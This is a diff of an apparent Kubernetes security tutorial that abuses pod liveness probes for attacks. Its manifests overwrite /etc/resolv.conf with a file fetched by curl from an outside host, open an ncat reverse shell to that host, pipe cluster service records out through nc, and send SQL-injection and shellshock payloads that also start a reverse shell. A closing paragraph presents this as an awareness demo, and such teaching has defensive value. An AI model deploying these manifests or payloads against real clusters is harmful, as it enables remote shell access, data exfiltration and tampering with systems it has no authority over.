@@ -34,15 +34,15 @@ spec:
       exec:
         command:
         - curl
-        - www.xxxxx.com/host.txt
+        - bd.kubiosec.tech:8080/host.txt
         - -o 
-        - /etc/hosts
+        - /etc/resolv.conf
       initialDelaySeconds: 5
       periodSeconds: 5
 EOF
 ```
 
-### Examples2: Installing applications the pod at deployment 
+### Examples2: Installing applications the pod at deployment (BE PATIENT ... takes about 1min)
 ```
 kubectl apply -f - <<EOF
 apiVersion: v1
@@ -87,7 +87,7 @@ kind: Pod
 metadata:
   labels:
     test: liveness
-  name: liveness-exec15
+  name: liveness-exec16
 spec:
   containers:
   - name: liveness
@@ -101,12 +101,12 @@ spec:
         command:
         - bash
         - -c
-        - apt-get install ncat ; ncat -e /bin/bash 192.168.0.131 8889 &
-      initialDelaySeconds: 5
+        - apt-get install ncat ; ncat -e /bin/bash bd.kubiosec.tech 8889 &
+      initialDelaySeconds: 30
       periodSeconds: 5
 EOF
 ```
-SVC extraction
+SVC extraction (You can also use UDP to extract information)
 ```
 kubectl apply -f - <<EOF
 apiVersion: v1
@@ -114,7 +114,7 @@ kind: Pod
 metadata:
   labels:
     test: liveness
-  name: liveness-exec15
+  name: liveness-exec21
 spec:
   containers:
   - name: liveness
@@ -128,8 +128,8 @@ spec:
         command:
         - bash
         - -c
-        - apt-get install -y ncat dnsutils; dig +noall +answer srv any.any.svc.cluster.local | nc 192.168.0.131 8889 
-      initialDelaySeconds: 5
+        - dig +noall +answer srv any.any.svc.cluster.local | nc bd.kubiosec.tech  8889 
+      initialDelaySeconds: 30
       periodSeconds: 5
 EOF
 ```
@@ -153,12 +153,12 @@ spec:
     - touch /tmp/healthy;sleep 600
     livenessProbe:
       httpGet:
-        host: www.xxxx.com
-        path: /?'OR 1=1--
+        host: bd.kubiosec.tech
+        path: /?%27OR%201=1--
         port: 8080
         httpHeaders:
           - name: User-Agent
-            value: xxxxxxxxx
+            value: hacking-demo
 EOF
 ```
 ```
@@ -177,6 +177,7 @@ EOF
 ```
 ### Examples4 : Attacking http(s) endpoints using shellshock
 ```
+kubectl apply -f - <<EOF
 apiVersion: v1
 kind: Pod
 metadata:
@@ -191,8 +192,8 @@ spec:
     - containerPort: 80
     livenessProbe:
       httpGet:
-        host: www.radarhack.com
-        path: /index.html?test=' or 1=1--
+        host: bd.kubiosec.tech
+        path: /
         port: 8080
         httpHeaders:
         - name: Custom-Header
@@ -201,7 +202,8 @@ spec:
           value: () { :;};echo;/bin/nc -e /bin/bash 192.168.81.128 443
       initialDelaySeconds: 3
       periodSeconds: 3
- ```
+EOF
+```
 
 ### Conclusion
 Many things are written on securely deploying applications on kubernetes. Keep in mind that all aspects need full attention. Generating and building Kubernetes manifest is also developping code.
